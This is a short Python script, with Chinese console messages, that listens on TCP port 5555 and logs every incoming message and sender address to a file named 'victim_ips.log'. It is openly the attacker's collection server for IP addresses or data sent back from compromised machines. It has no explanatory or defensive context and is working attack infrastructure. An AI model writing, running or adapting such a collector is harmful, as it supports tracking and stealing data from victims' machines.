import socket
import datetime

HOST = '0.0.0.0'
PORT = 5555

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(5)

print(f"监听 {HOST}:{PORT} 等待受害者IP...")

with open('victim_ips.log', 'a') as log_file:
    while True:
        conn, addr = s.accept()
        data = conn.recv(1024)
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        message = f"[{timestamp}] 收到: {data.decode()} 从 {addr[0]}\n"
        print(message, end='')
        log_file.write(message)
        log_file.flush()
        conn.close()